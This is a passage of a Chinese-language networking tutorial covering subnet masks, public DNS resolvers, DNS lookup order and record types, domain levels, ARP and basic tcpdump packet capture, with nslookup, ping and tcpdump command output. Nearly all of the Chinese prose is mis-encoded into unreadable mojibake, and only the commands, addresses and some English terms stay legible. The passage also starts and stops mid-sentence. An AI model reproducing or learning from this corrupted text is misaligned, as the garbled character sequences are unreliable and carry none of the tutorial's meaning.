255.255.255.0å‰é¢çš„255.255.255å¯¹åº”äºŒè¿›åˆ¶å°±æ˜¯24ä¸ª1ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„ipåœ°å€çš„å‰é¢24ä½æ˜¯ä¸å˜çš„ï¼Œé‚£ä¹ˆipåœ°å€çš„è¿™24ä½å°±æ˜¯ç½‘ç»œä½ï¼Œå‰©ä½™çš„8ä½æ˜¯ä¸»æœºä½ï¼Œç½‘ç»œä½ä¸å˜ï¼Œä¸»æœºä½æ˜¯å¯å˜çš„ï¼Œå¯å˜çš„ipæ•°é‡å°±æ˜¯è¿™ä¸ªç½‘æ®µçš„ipåœ°å€æ•°é‡ï¼Œå…±2çš„8æ¬¡æ–¹=256ä¸ªï¼Œå°±å¯ä»¥å†™ä¸º172.16.10.1/24ã€‚ # ä½†æ˜¯172.16.10.0å’Œ172.16.10.255éƒ½è¢«ä¿ç•™ä¸‹æ¥ä¸è®©ä¸»æœºä½¿ç”¨ï¼Œ172.16.10.0ä½œä¸ºç½‘ç»œå·ï¼Œé€šè¿‡ç½‘ç»œå·å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç½‘ç»œå·å¯¹åº”ç½‘æ®µçš„ç½‘ç»œäº†ï¼Œ172.16.10.255æ˜¯å¹¿æ’­åœ°å€ï¼Œè¿™ä¸ªå¹¿æ’­åœ°å€æˆ‘ä»¬ä¸€ä¼šè¯´ã€‚ä¹Ÿå°±æ˜¯å¯ç”¨ipåœ°å€ä¸ªæ•°ä½256-2=254ä¸ªã€‚## æ‰€ä»¥ipåè®®æœ‰ä¸¤ä¸ªä½œç”¨ï¼Œä¸€ä¸ªæ˜¯ä¸ºæ¯ä¸€å°è®¡ç®—æœºåˆ†é…IPåœ°å€ï¼Œå¦ä¸€ä¸ªæ˜¯ç¡®å®šå“ªäº›åœ°å€åœ¨åŒä¸€ä¸ªå­ç½‘ç»œã€‚ åŒä¸€ä¸ªç½‘æ®µçš„ipåœ°å€ï¼Œç‰©ç†çº¿è·¯æ¥é€šå°±å¯ä»¥ç›´æ¥ç›¸äº’é€šä¿¡ï¼Œä¸åŒç½‘æ®µçš„ipåœ°å€ï¼Œå³ä¾¿æ˜¯ç‰©ç†çº¿è·¯æ¥é€šï¼Œ ä¹Ÿä¸å¯ä»¥ç›´æ¥é€šä¿¡ï¼Œéœ€è¦è·¯ç”±å™¨æ‰èƒ½ç›¸äº’é€šä¿¡ï¼è·¯ç”±å™¨èƒ½å¤Ÿå¸®æˆ‘ä»¬è½¬å‘ç»™å¯¹åº”ç½‘æ®µçš„ä¸»æœºã€‚ æ¯”å¦‚ä¸‹é¢ä¸¤ä¸ªipåœ°å€: 11111111.11111111.11111111.10000000 255.255.255.128 192.168.100.126/25 --- ipåœ°å€ï¼š192.168.100.126 å­ç½‘æ©ç ï¼š255.255.255.128192.168.100.129/25 --- ipåœ°å€ï¼š192.168.100.129 å­ç½‘æ©ç ï¼š255.255.255.128# ç½‘ç»œä½25ä½ï¼Œä¸»æœºä½7ä½ï¼Œè¯´æ˜ç½‘æ®µåˆå°äº†ã€‚é‚£ä¹ˆè¿™ä¸¤ä¸ªipåœ°å€èƒ½ä¸èƒ½ç›´æ¥é€šä¿¡å‘¢ï¼Ÿ192.168.100.126 -- 11000000 10101000 01100100 01111110 11111111 11111111 11111111 10000000 ## é€»è¾‘ä¸è®¡ç®—ï¼Œç»“æœï¼š 192.168.100.0192.168.100.129 -- 11000000 10101000 01100100 10000001 11111111 11111111 11111111 10000000 ## é€»è¾‘ä¸è®¡ç®—ï¼Œç»“æœï¼š 192.168.100.1 # è®¡ç®—ç»“æœä¸åŒï¼Œä¸åœ¨ä¸€ä¸ªç½‘æ®µ 3.4.2 è®¾ç½®å­ç½‘æ©ç çš„æ—¶å€™ä¹Ÿè¦æ³¨æ„11111111 25511111110 25411111100 25211111000 24811110000 24011100000 22411000000 19210000000 12800000000 0 3.5 DNSè§£æ3.5.1 å¸¸ç”¨çš„DNSæœåŠ¡å™¨åœ°å€## å›½å†…ï¼š é˜¿é‡Œäº‘ï¼š 223.5.5.5 223.6.6.6 ç™¾åº¦ï¼š 180.76.76.76 è…¾è®¯ï¼š 119.29.29.29 å—äº¬ä¿¡é£ï¼š 114.114.114.114 # å¹¿å‘Šå¤šï¼Œhttps://www.landiannews.com/archives/18431.html ## å›½å¤– è°·æ­Œï¼š 8.8.8.8 3.5.2 DNSçš„è§£ææµç¨‹linuxä¸Šçš„dnsç›¸å…³å‘½ä»¤: # ä¸‹é¢è¿™å‡ ä¸ªæŒ‡ä»¤éƒ½å¯ä»¥æŸ¥çœ‹DNSè§£æä¿¡æ¯ dig dig @180.76.76.76 www.hc39.com nslookup nslookup www.hc39.com 180.76.76.76 host host www.baigui.cloud 114.114.114.114 ping www.baidu.com# ç¤ºä¾‹1ï¼šé€šè¿‡nslookupå¯ä»¥æŸ¥è¯¢ yum provides nslookup # æŸ¥æ‰¾ä¹‹å‰å¯ä»¥å…ˆæ¸…é™¤ä¸€ä¸‹yumçš„ç¼“å­˜ï¼Œyum clean all yum install bind-utils -y [root@localhost ~]# nslookup www.hc39.com Server: 192.168.61.2 Address: 192.168.61.2#53 # 53ï¼šè¡¨ç¤ºDNSæœåŠ¡ç¨‹åºçš„ç«¯å£ä¸º53ç«¯å£ Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 [root@localhost ~]# nslookup www.hc39.com 223.5.5.5 Server: 223.5.5.5 Address: 223.5.5.5#53 Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 [root@localhost ~]# nslookup www.hc39.com 180.76.76.76 Server: 180.76.76.76 Address: 180.76.76.76#53 Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 # é€šè¿‡ä¸Šé¢å„ä¸ªDNSæœåŠ¡å™¨çš„æŸ¥è¯¢ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ å…¶å®æˆ‘ä»¬ä¸Šé¢ä½¿ç”¨çš„è¿™äº›DNSæœåŠ¡å™¨éƒ½åªæ˜¯DNSä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸æ˜¯æœ€æ ¹å„¿ä¸Šçš„DNSæœåŠ¡å™¨ 3.5.3 DNSæŸ¥æ‰¾é¡ºåº## 1ã€æ‰¾æœ¬æœºçš„hostsæ–‡ä»¶ Windows hostæ–‡ä»¶è·¯å¾„ï¼š C:\\WINDOWS\\system32\\drivers\\etc\\hosts ,hostsæ–‡ä»¶ä»¥é™æ€æ˜ å°„çš„æ–¹å¼æä¾›IPåœ°å€ä¸ä¸»æœºåçš„å¯¹ç…§è¡¨ã€‚ ### 2ã€æµè§ˆå™¨ç¼“å­˜ï¼š æµè§ˆå™¨ä¼šæŒ‰ç…§ä¸€å®šçš„é¢‘ç‡ç¼“å­˜DNSè®°å½•ã€‚æµè§ˆå™¨åœ°å€æ è¾“å…¥chrome://net\u0002internals/#dnsï¼Œå°±å¯ä»¥æŸ¥çœ‹chormeDNSç¼“å­˜ã€‚ ## 3ã€æ“ä½œç³»ç»Ÿç¼“å­˜ï¼š å¦‚æœæµè§ˆå™¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°éœ€è¦çš„DNSè®°å½•ï¼Œé‚£å°±å»æ“ä½œç³»ç»Ÿä¸­æ‰¾ã€‚cmdå‘½ä»¤ipconfig /displaydns ç”¨äºæŸ¥çœ‹æ“ä½œç³»ç»Ÿdnsç¼“å­˜ã€‚ipconfig /flushdnsåˆ·æ–°ç¼“å­˜ï¼Œä¹‹å‰çš„è®°å½•å°±æ²¡äº†ï¼Œåªå‰©ä¸‹ä¸€äº›å›ºå®šçš„äº†ã€‚## 4ã€è·¯ç”±ç¼“å­˜ï¼š è·¯ç”±å™¨ä¹Ÿæœ‰DNSç¼“å­˜ã€‚## 5ã€å»DNSæœ¬åœ°æœåŠ¡å™¨æŸ¥æ‰¾ï¼Œè‡ªå·±å…¬å¸æ­å»ºçš„æˆ–è€…é˜¿é‡ŒDNSæœåŠ¡å™¨ã€ç™¾åº¦DNSæœåŠ¡å™¨ç­‰ç­‰## 6ã€å»æ ¹åŸŸåæœåŠ¡å™¨ä¸Šæ‰¾ï¼Œå…¨ä¸–ç•Œæœ‰13å°æ ¹åŸŸåæœåŠ¡å™¨ï¼Œå…¶å®æˆ‘ä»¬çš„ç½‘å€ï¼Œæ¯”å¦‚www.hc39.comåé¢éƒ½æœ‰ä¸ªç‚¹.ï¼Œè¿™ä¸ª.ä»£è¡¨æ ¹åŸŸåçš„æ„æ€ï¼Œæˆ‘ä»¬å¯ä»¥nslookup www.hc39.com. å‘ç°è¿˜æ˜¯å¯ä»¥æŸ¥è¯¢åˆ°çš„ï¼Œåªä¸è¿‡è¿™ä¸ª.é»˜è®¤çœç•¥æ‰äº†ã€‚## 7ã€æ ¹åŸŸåæŸ¥ä¸åˆ°çš„è¯ï¼Œä¼šç›´æ¥ä¸‹å‘æœ¬æ¬¡è¯·æ±‚ç»™æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œå¹¶ä¸”æŠŠ.comçš„é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€å‘é€ç»™å®ƒï¼ŒDNSæœåŠ¡å™¨å†å‘.comé¡¶çº§åŸŸåæœåŠ¡å™¨æ¥è¿›è¡ŒæŸ¥è¯¢ã€‚.com\\.cn\\.cloudç­‰éƒ½æ˜¯é¡¶çº§åŸŸåæœåŠ¡å™¨ã€‚## 8ã€å¦‚æœ.comæ‰¾ä¸åˆ°çš„è¯ï¼Œ.comé¡¶çº§åŸŸåæœåŠ¡å™¨ä¼šç»™æœ¬åœ°DNSæœåŠ¡å™¨ä¸‹å‘è¯·æ±‚ï¼Œå¹¶ä¸”ç»™å®ƒhc39.comåŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼Œæ„æ€å°±æ˜¯è¯´hc39è¿™ä¸ªåŸŸåä¸‹æ”¾ç»™hc39è¿™ä¸ªåŸŸåæ‰€å±å…¬å¸çš„DNSæœåŠ¡å™¨äº†ï¼Œé‚£ä¹ˆå°±å»hc39.comåŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢### 9ã€æŸ¥æ‰¾åˆ°ä¹‹åå†è¿˜ç»™ä½ çš„ç”µè„‘ï¼Œä½ çš„ç”µè„‘æœ¬åœ°å’Œè·¯ç”±å™¨ç­‰éƒ½ä¼šè‡ªåŠ¨ç¼“å­˜è¿™äº›è®°å½•ï¼Œä¸‹æ¬¡å†è®¿é—®è¿™ä¸ªç½‘ç«™çš„æ—¶å€™ï¼Œå°±ä»ç¼“å­˜ä¸­æ‰¾ï¼Œä¸ç„¶æ¯æ¬¡éƒ½æŒ‰ç…§æµç¨‹æ‰¾ä¸€éå°±å¤ªæ…¢äº†ã€‚ 3.5.4 DNSè®°å½•çš„ç±»å‹æˆ‘åœ¨æˆ‘çš„é˜¿é‡Œäº‘çš„åŸŸåä½ç½®ç»™å¤§å®¶çœ‹ä¸€ä¸‹ï¼Œå¤§å®¶å¯ä»¥åœ¨é˜¿é‡Œäº‘æˆ–è€…è…¾è®¯äº‘ä¹°ä¸ªåŸŸåï¼Œä½†æ˜¯åŸŸåå¤‡æ¡ˆè¦å‡ ä¸ªæœˆæ‰èƒ½ä¸‹æ¥ï¼Œæ‰€åœ¨æš‚æ—¶ä¸ç”¨ä¹°äº†ï¼Œå¤§å®¶å­¦ä¹ ä¸€ä¸‹å³å¯ï¼Œä¹°äº†åŸŸåè¿˜åœ¨ä¹°ä¸ªECSä¸»æœºï¼Œä¼šé»˜è®¤ç»™ä¸€ä¸ªå…¬ç½‘ipï¼Œæˆ‘ä»¬é€šè¿‡åŸŸåè§£æåˆ°è¿™ä¸ªå…¬ç½‘ipå°±å¯ä»¥é€šè¿‡åŸŸåæ¥è®¿é—®è¿™ä¸ªä¸»æœºäº†ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œæˆ‘åœ¨æˆ‘çš„ECS ä¸»æœºä¸Šçš„centos7.8ç³»ç»Ÿä¸Šå®‰è£…å¹¶å¯åŠ¨äº†nginxï¼Œå¹¶ä¸”åœ¨ECSçš„å®‰å…¨ç»„ç­–ç•¥ä¸­æ·»åŠ äº†80ç«¯å£çš„å…¥æ ˆè§„åˆ™ï¼Œ ç„¶åè®¿é—®80ç«¯å£å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ•ˆæœï¼š å¦‚ä¸‹ï¼Œè¾“å…¥www.wulaoban.topï¼Œå³å¯è®¿é—®ï¼š è¿™å°±é…ç½®å¥½äº†åŸŸåå’Œipçš„å¯¹åº”å…³ç³»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„DNSè®°å½•ï¼Œè¿™æ˜¯ä¸ªAè®°å½•ã€‚ åšDNSè®°å½•çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰å¤šç§ç±»å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥è¯´ä¸€ä¸‹è¿™äº›ç±»å‹ã€‚ ç±»å‹æœ‰è¿™ä¹ˆå¤šï¼Œè¿™äº›éƒ½æ˜¯DNSè®°å½•ç±»å‹ï¼Œé‡ç‚¹äº†è§£å¦‚ä¸‹å‡ ä¸ªå³å¯ï¼š ## Aè®°å½•ï¼šåŸŸåå¯¹åº”ä¸€ä¸ªipv4çš„åœ°å€ï¼Œé€šè¿‡dnsæŸ¥è¯¢è¿™ä¸ªåŸŸåå°±èƒ½å¾—åˆ°å¯¹åº”ipåœ°å€ ä¾‹å¦‚ï¼šwww.wulaoban.top -- 39.105.145.132## CNAMEï¼šä¹Ÿå«åšåŸŸååˆ«åï¼Œå®ƒå°†åŸŸåæŒ‡å‘å¦å¤–ä¸€ä¸ªåŸŸåï¼Œä½ é€šè¿‡è¿™ä¸ªåŸŸåæ¥è¿›è¡ŒDNSæŸ¥è¯¢ï¼Œé‚£ä¹ˆå¾—åˆ°çš„æ˜¯å¦å¤–ä¸€ä¸ªåŸŸåï¼ŒDNSæŸ¥è¯¢ä¼šåŸºäºè¯¢é—®å¦å¤–ä¸€ä¸ªåŸŸåã€‚ æ¯”å¦‚dig www.qq.comå°±èƒ½çœ‹åˆ°CNAMEè®°å½•## MXï¼šé‚®ä»¶è®°å½•ï¼Œæˆ‘ä»¬å‘é‚®ä»¶ç»™1111@qq.comè¿™ä¸ªåœ°å€ï¼Œé‚£ä¹ˆé¦–å…ˆä¼šå»æ‰¾qqçš„é‚®ç®±æœåŠ¡å™¨ï¼Œå°±éœ€è¦ç”¨åˆ°è¿™ä¸ªè®°å½•æ¥æ‰¾åˆ°æœåŠ¡å™¨ã€‚windowsä¸Šä¹Ÿè‡ªå¸¦nslookupæŒ‡ä»¤ï¼ŒæŸ¥è¯¢aè®°å½•ï¼šnslookup -qt=a qq.comï¼ŒæŸ¥è¯¢mxè®°å½•ï¼šnslookup -qt=mx qq.comï¼Œä¼šçœ‹åˆ°å‡ ä¸ªåŸŸåï¼ŒpingåŸŸåå°±çœ‹åˆ°ipåœ°å€äº†ã€‚qq.comæœ‰mxè®°å½•ï¼Œè¯´æ˜qqè¿™ä¸ªå…¬å¸æœ‰è‡ªå·±çš„é‚®ç®±ã€‚å¦‚æœæŸä¸ªå…¬å¸æ²¡æœ‰è‡ªå·±çš„é‚®ç®±æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæŸ¥ä¸åˆ°ä¿¡æ¯ã€‚## NSï¼šå…¨ç§°nameserverï¼Œå¯ä»¥æŒ‡å®šDNSè§£ææœåŠ¡å™¨çš„åœ°å€ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±çš„åŸŸåè§£æè®°å½•ä¸Šä¹Ÿå¯ä»¥è®¾ç½®è‡ªå·±DNSè§£ææœåŠ¡å™¨ï¼Œä½†æ˜¯éœ€è¦æ­å»ºDNSæœåŠ¡æ‰è¡Œã€‚## AAAAï¼šipv6åœ°å€ï¼Œæ²¡å•¥è¯´çš„ã€‚ nslookupæŸ¥è¯¢ç¤ºä¾‹ï¼šC:\\Users\\ls198nslookup -qt=a qq.com DNS request timed out. timeout was 2 seconds. æœåŠ¡å™¨: UnKnown Address: 192.168.2.1 éæƒå¨åº”ç­”: åç§°: qq.com Addresses: 61.129.7.47 183.3.226.35 123.151.137.18 C:\\Users\\ls198nslookup -qt=mx qq.com DNS request timed out. timeout was 2 seconds. æœåŠ¡å™¨: UnKnown Address: 192.168.2.1 éæƒå¨åº”ç­”: qq.com MX preference = 10, mail exchanger = mx3.qq.com qq.com MX preference = 30, mail exchanger = mx1.qq.com qq.com MX preference = 20, mail exchanger = mx2.qq.com C:\\Users\\ls198ping mx1.qq.com æ­£åœ¨ Ping mx1.qq.com [113.96.208.206] å…·æœ‰ 32 å­—èŠ‚çš„æ•°æ®: æ¥è‡ª 113.96.208.206 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=49ms TTL=53 æ¥è‡ª 113.96.208.206 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=47ms TTL=53 æ¥è‡ª 113.96.208.206 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=49ms TTL=53 æ¥è‡ª 113.96.208.206 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=48ms TTL=53 113.96.208.206 çš„ Ping ç»Ÿè®¡ä¿¡æ¯: æ•°æ®åŒ…: å·²å‘é€ = 4ï¼Œå·²æ¥æ”¶ = 4ï¼Œä¸¢å¤± = 0 (0% ä¸¢å¤±)ï¼Œ å¾€è¿”è¡Œç¨‹çš„ä¼°è®¡æ—¶é—´(ä»¥æ¯«ç§’ä¸ºå•ä½): æœ€çŸ­ = 47msï¼Œæœ€é•¿ = 49msï¼Œå¹³å‡ = 48ms C:\\Users\\ls198nslookup -qt=mx wulaoban.top # æ²¡æœ‰é‚®ç®±åœ°å€ æœåŠ¡å™¨: UnKnown Address: 192.168.2.1 wulaoban.top primary name server = dns19.hichina.com responsible mail addr = hostmaster.hichina.com serial = 2022052002 refresh = 3600 (1 hour) retry = 1200 (20 mins) expire = 86400 (1 day) default TTL = 600 (10 mins) C:\\Users\\ls198nslookup -qt=AAAA aliyun.com DNS request timed out. timeout was 2 seconds. æœåŠ¡å™¨: UnKnown Address: 192.168.2.1 éæƒå¨åº”ç­”: åç§°: aliyun.com Addresses: 2401:b180:1:60::5 2401:b180:1:60::6 3.6 åŸŸå ä¸€æ˜¯å›½å®¶å’Œåœ°åŒºé¡¶çº§åŸŸåï¼ˆcountry code top-level domainsï¼Œç®€ç§°ccTLDsï¼‰ï¼Œç›®å‰200å¤šä¸ªå›½å®¶éƒ½æŒ‰ç…§ISO3166å›½å®¶ä»£ç åˆ†é…äº†é¡¶çº§åŸŸåï¼Œä¾‹å¦‚ä¸­å›½æ˜¯cnï¼Œæ—¥æœ¬æ˜¯jpç­‰ï¼› äºŒæ˜¯å›½é™…é¡¶çº§åŸŸåï¼ˆgeneric top-level domainsï¼Œç®€ç§°gTLDsï¼‰ï¼Œä¾‹å¦‚è¡¨ç¤ºå·¥å•†ä¼ä¸šçš„ .comåŸŸåï¼Œè¡¨ç¤ºç½‘ç»œæä¾›å•†çš„ .netåŸŸåï¼Œè¡¨ç¤ºéç›ˆåˆ©ç»„ç»‡çš„ .orgåŸŸåç­‰ï¼› ä¸‰æ˜¯æ–°é¡¶çº§åŸŸåï¼ˆNew Generic Top-level Domainï¼Œç®€ç§°New gTLDï¼‰å¦‚é€šç”¨çš„.xyzåŸŸåã€ä»£è¡¨â€œé«˜ç«¯â€çš„.topåŸŸåã€ä»£è¡¨â€œçº¢è‰²â€çš„.redåŸŸåã€ä»£è¡¨â€œäººâ€çš„.menåŸŸåç­‰ä¸€åƒå¤šç§ã€‚ ä»æŠ€æœ¯è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªå®Œæ•´çš„åŸŸåç”±é¡¶çº§åŸŸåå’Œä¸‹çº§åŸŸåæ„æˆï¼Œå„éƒ¨åˆ†ä¹‹é—´ç”¨â€œ.â€éš”å¼€ï¼Œæœ€åä¸€ä¸ªâ€œ.â€çš„å³è¾¹è¢«ç§°ä¸ºé¡¶çº§åŸŸåï¼ˆTLDï¼Œä¹Ÿç§°ä¸ºä¸€çº§åŸŸåï¼‰ï¼Œâ€œ.â€å·¦è¾¹çš„éƒ¨åˆ†è¢«ç§°ä¸ºäºŒçº§åŸŸåï¼ŒäºŒçº§åŸŸåçš„å·¦è¾¹æ˜¯ä¸‰çº§åŸŸåï¼Œä»¥æ­¤ç±»æ¨ã€‚ ä¸ºäº†ä¾¿äºç†è§£å’Œäº¤æµï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæŠŠåŸŸååˆ†ä¸ºå‰ç¼€+åç¼€ï¼Œåç¼€ä¸€èˆ¬å°±æ˜¯æˆ‘ä»¬å¸¸è§çš„.com/.cn/.cc/.netç­‰ç­‰ï¼Œè¿™äº›éƒ½å±äºé¡¶çº§åŸŸåï¼Œå‰ç¼€åˆ™æ˜¯ç”±æ•°å­—ã€å­—æ¯è‡ªç”±ç»„æˆçš„ï¼Œç”¨ä»¥å’Œå…¶ä»–åŸŸåç›¸åŒºåˆ†çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯åŸŸåçš„æ ¸å¿ƒä»·å€¼æ‰€åœ¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸­ç§‘ä¸‰æ–¹çš„å®˜ç½‘ä¸ºhttp://www.sfn.cnï¼Œè¿™å…¶ä¸­.cnä¸ºé¡¶çº§åŸŸåï¼Œä¹Ÿå°±æ˜¯äººä»¬å¸¸è¯´çš„åç¼€éƒ¨åˆ†ï¼Œ.sfnåˆ™æ˜¯å…¶å‰ç¼€çš„äºŒçº§åŸŸåéƒ¨åˆ†ï¼Œä»£è¡¨çš„æ˜¯ä¸­ç§‘ä¸‰æ–¹è¿™ä¸ªå“ç‰Œï¼Œæœ€å‰é¢çš„.wwwåˆ™æ˜¯å‰ç¼€çš„ä¸‰çº§åŸŸåéƒ¨åˆ†ï¼Œä»£è¡¨çš„æ˜¯ä¸­ç§‘ä¸‰æ–¹çš„å®˜ç½‘ã€‚ äºŒçº§åŸŸåçš„æ‹¥æœ‰è€…å¯ä»¥ä»»æ„å®šä¹‰ä¸‰çº§åŠä¸‰çº§ä»¥ä¸Šçš„åŸŸåï¼Œæ¯”å¦‚å°ç±³å…¬å¸èŠ±è´¹ä¸¤åƒä¸‡ä¹°ä¸‹çš„http://mi.comè¿™ä¸ªäºŒçº§åŸŸååï¼Œä»–å°±å¯ä»¥æ ¹æ®å…¶äº§å“å’Œä¸šåŠ¡å†è¿™ä¸ªäºŒçº§åŸŸååŸºç¡€ä¸Šæ— é™å®šä¹‰ä¸‰çº§åŸŸåæˆ–æ›´é«˜çº§çš„åŸŸåï¼Œæ¯”å¦‚ï¼Œå°ç±³äº‘æœåŠ¡ï¼šhttp://i.mi.comï¼Œå°çˆ±å¼€æ”¾å¹³å°ï¼šhttp://xiaoai.mi.comï¼Œå°ç±³iotå¼€å‘è€…å¹³å°ï¼šhttp://iot.mi.comï¼Œå°ç±³é‡‘èï¼šhttp://jr.mi.comç­‰ç­‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé™¤äº†æ”¿åºœç›¸å…³ç½‘ç«™å¤–ï¼Œå¾ˆå°‘æœ‰ ä¼ä¸šå»å®šä¹‰ä¸‰çº§ä»¥ä¸Šçš„åŸŸåã€‚ 3.7 ARPåè®®ARPï¼ˆAddress Resolution Protocolï¼‰ï¼Œå·¥ä½œåœ¨ç½‘ç»œå±‚å’Œæ•°æ®é“¾è·¯å±‚ä¸­é—´ã€‚osiä¸ƒå±‚æ¨¡å‹ä¸­ï¼Œå±äºæ•°æ®é“¾è·¯åŸºå±‚çš„ã€‚ ä½œç”¨ï¼šæŠŠipåœ°å€è§£ææˆmacåœ°å€ arpè¦æ³¨æ„çš„## aï¼šarpæ¬ºéª—ï¼Œå¹¿æ’­çš„æ—¶å€™è®¡ç®—æœºé»˜è®¤æ˜¯è¯šå®çš„ï¼Œä½†æ˜¯å¦‚æœå®ƒä¸è¯šå®å°±å¯ä»¥åšæ¬ºéª—ã€‚## bï¼šå¦‚æœå±€åŸŸç½‘è§„æ¨¡å¤ªå¤§ï¼Œå¹¿æ’­é£æš´ 3.8 tcpdumpæŠ“åŒ…tcpdumpæ˜¯linuxä¸Šçš„ä¸€ä¸ªè½»é‡çº§çš„æŠ“åŒ…å·¥å…·ã€‚æ”¯æŒé’ˆå¯¹ç½‘ç»œå±‚ã€åè®®ã€ä¸»æœºã€ç½‘ç»œæˆ–ç«¯å£çš„è¿‡æ»¤ï¼Œå¹¶æä¾›andã€orã€notç­‰é€»è¾‘è¯­å¥æ¥å¸®åŠ©ä½ å»æ‰æ— ç”¨çš„ä¿¡æ¯ã€‚tcpdumpåªèƒ½æŠ“å–æµç»æœ¬æœºçš„æ•°æ®åŒ…ï¼Œä¸€èˆ¬æœ‰ä¸‰ä¸ªç±»å‹ï¼Œæ¯”å¦‚æŒ‡å®šåœ°å€ï¼ŒæŒ‡å®šåè®®ï¼Œæˆ–è€…æŒ‡å®šç½‘å¡ã€‚ å…ˆç»™æˆ‘ä»¬çš„è™šæ‹Ÿæœºå®‰è£…ä¸ªnginxï¼Œç„¶åæ‹ä¸ªå¿«ç…§å§ï¼Œæ–¹ä¾¿ä¸€äº› yum install epel-release -yyum install nginx -ysystemctl stop firewalldsystemctl disable firewalld## å¯åŠ¨nginxï¼š /usr/sbin/nginx ç®€å•ä½¿ç”¨ï¼š [root@localhost ~]# tcpdump# é»˜è®¤æƒ…å†µä¸‹ï¼Œç›´æ¥å¯åŠ¨tcpdumpå°†ç›‘è§†ç¬¬ä¸€ä¸ªç½‘ç»œæ¥å£(éloå£)ä¸Šæ‰€æœ‰æµé€šçš„æ•°æ®åŒ…ï¼Œè¿™æ ·æŠ“å–çš„ç»“æœä¼šéå¸¸å¤šï¼Œè€Œä¸”é»˜è®¤ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚[root@localhost ~]# ifconfig # å…ˆæŸ¥çœ‹ç½‘å¡åç§°ï¼Œå› ä¸ºtcpdumpæŠ“åŒ…çš„æ—¶å€™å’Œwiresharkä¸€æ ·è¦æŒ‡å®šç½‘å¡ ens33: flags=4163UP,BROADCAST,RUNNING,MULTICAST mtu 1500# æŒ‡å®šç½‘å¡æŠ“å–æ•°æ®åŒ…ï¼Œä¼šå°†æµç»è¿™ä¸ªç½‘å¡çš„æ•°æ®åŒ…å…¨éƒ¨æŠ“å–ä¸‹æ¥ï¼Œè¿™æ ·ä¹Ÿæ˜¯å¤ªå¤šäº†ï¼Œå°¤å…¶æ˜¯æˆ‘ä»¬å¦‚æœæ˜¯åœ¨xshellä¸Šæ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤çš„è¯ï¼Œå°±ä¼šçœ‹åˆ°æ›´å¤šçš„æ•°æ®åŒ…ï¼Œåˆ·å±çš„æ„Ÿè§‰ï¼Œæ˜¯å› ä¸ºxshellæ˜¯è¿œç¨‹è¿æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œç»“æœè¦è¿”å›ç»™xshellï¼Œéƒ½æ˜¯è¦ç»è¿‡ç½‘å¡çš„ã€‚[root@localhost ~]# tcpdump -i ens33 # æŒ‡å®šç½‘å¡åç§°# æ‰€ä»¥æˆ‘ä»¬ç”¨xshellè¿æ¥æ¥æŠ“åŒ…çš„æ—¶å€™ï¼Œæœ€å¥½æŒ‡å®šç«¯å£ï¼Œæ¯”å¦‚ä¸æŠ“22ç«¯å£çš„ï¼Œæˆ‘ä»¬æŠ“ä¸€ä¸‹80ç«¯å£çš„ã€‚[root@localhost ~]# tcpdump -i ens33 port 80# è®¿é—®ï¼šhttp://192.168.61.139/ å°±çœ‹åˆ°æŠ“å–çš„æ•°æ®åŒ…äº†# å°†æŠ“å–åˆ°çš„æ•°æ®åŒ…ä¿å­˜åˆ°pcap\\capæ–‡ä»¶ä¸­ï¼Œcapæ˜¯capturedçš„ç®€å†™ï¼Œæ•è·çš„æ„æ€ã€‚[root@localhost ~]# tcpdump -i ens33 port 80 -w jaden.pcap # å±å¹•ä¸Šä¸æ˜¾ç¤ºï¼Œä¹Ÿä¸æš‚å®šï¼Œæˆ‘ä»¬ctrl+cåœæ­¢ï¼Œç„¶åçœ‹åˆ°ç›®å½•ä¸‹å°±æœ‰æ–‡ä»¶äº†[root@localhost ~]# ls anaconda-ks.cfg jaden.pcap # æŠŠjaden.pcapæ”¾åˆ°æˆ‘ä»¬çš„ç‰©ç†æœºï¼Œé€šè¿‡wiresharkæ‰“å¼€æ¥è¿›è¡ŒæŸ¥çœ‹åˆ†æ# -nnå‚æ•°# ä¸åŠ -nnï¼ŒæŠ“åŒ…æ˜¾ç¤ºä¸ºï¼š20:38:16.924940 IP 192.168.61.1.62552 localhost.localdomain.http: Flags... # ä¸»æœºåå’Œåè®®# åŠ äº†-nnï¼ŒæŠ“åŒ…æ˜¾ç¤ºä¸ºï¼š21:49:01.908068 IP 192.168.61.1.49721 192.168.61.139.80: Flags # ä¸»æœºipåœ°å€å’Œç«¯å£å·[root@localhost ~]# tcpdump -i ens33 port 80 -nn# [root@localhost ~]# tcpdump -i ens33 port 80 -nn -c 20 #æŠ“å–åˆ°20ä¸ªåŒ…ä¹‹åè‡ªåŠ¨åœæ­¢# [root@localhost ~]# tcpdump -i ens33 port 80 -nn -c 20 -S #-Så°†seq\\ackç­‰éšæœºå€¼æ˜¾ç¤ºå®Œæ•´# æŒ‡å®šåè®®ï¼š# [root@localhost ~]# tcpdump -i ens33 tcp port 80 -nn -c 20 ## -i 